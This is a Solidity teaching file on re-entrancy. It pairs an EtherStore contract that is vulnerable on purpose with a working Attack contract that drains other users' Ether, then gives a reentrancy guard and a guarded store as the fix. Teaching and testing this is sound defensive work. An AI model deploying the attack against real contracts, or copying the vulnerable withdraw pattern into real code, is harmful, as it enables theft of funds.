// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
Re-Entrancy
Vulnerability
Let's say that contract A calls contract B.

Reentracy exploit allows B to call back into A before A finishes execution.

EtherStore is a contract where you can deposit and withdraw ETH.
This contract is vulnerable to re-entrancy attack.
Let's see why.

1. Deploy EtherStore
2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
3. Deploy Attack with address of EtherStore
4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
   plus 1 Ether sent from this contract).

What happened?
Attack was able to call EtherStore.withdraw multiple times before
EtherStore.withdraw finished executing.

Here is how the functions were called
- Attack.attack
- EtherStore.deposit
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack.fallback (receives 1 Ether)
- EtherStore.withdraw
- Attack fallback (receives 1 Ether)
 */
contract EtherStore001 {
    mapping(address => uint256) public balances;

    function deposit() public payable virtual {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public virtual {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack001 {
    EtherStore001 public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore001(_etherStoreAddress);
    }

    // Receive is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum is 1 ether");
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/*
Preventative Techniques
- Ensure all state changes happen before calling external contracts
- Use function modifiers that prevent re-entrancy
Here is a example of a re-entracy guard
*/
abstract contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor() {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and making it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}

contract SafeEtherStore001 is EtherStore001, ReentrancyGuard {
    function deposit() public payable override nonReentrant {
        super.deposit();
    }

    function withdraw() public override nonReentrant {
        super.withdraw();
    }
}

contract Attack002 {
    SafeEtherStore001 public safeEtherStore;

    constructor(address _safeEtherStoreAddress) {
        safeEtherStore = SafeEtherStore001(_safeEtherStoreAddress);
    }

    // Receive is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(safeEtherStore).balance >= 1 ether) {
            safeEtherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Minimum is 1 ether");
        safeEtherStore.deposit{value: 1 ether}();
        safeEtherStore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
